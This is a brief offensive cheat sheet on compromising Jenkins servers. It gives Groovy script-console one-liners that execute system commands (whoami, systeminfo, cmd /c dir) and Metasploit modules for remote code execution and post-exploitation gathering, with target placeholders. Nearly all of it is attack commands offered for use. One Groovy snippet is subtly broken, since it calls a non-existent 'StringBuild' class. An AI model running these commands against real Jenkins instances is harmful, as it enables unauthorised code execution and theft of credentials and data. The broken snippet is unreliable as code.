# Jenkins

## Scripting

```groovy
println "<command>".execute().text;

println "whoami".execute().text;

println "systeminfo".execute().text;
```

```groovy
println "Command processor"
def sout = new StringBuild(), serr = new StringBuilder();
def args = ["cmd", "/c", "dir C:\\path\\to\\directory\\"];
def proc = new ProcessBuilder(args);
Process process = proc.start();
process.consumeProcessOutput(sout, serr);
process.waitForOrKill(2000);
println sout;
```

## Metasploit

```
msf > use exploit/multi/http/jenkins_script_console

set rhost <target_IP>

set rport <target_PORT>
```

`msf > use post/multi/gather/jenkins_gather`

---
## References

- [Double Pivoting | Metasploit and Manual Pivoting](https://www.hdysec.com/double-pivoting-both-metasploit-and-manual/)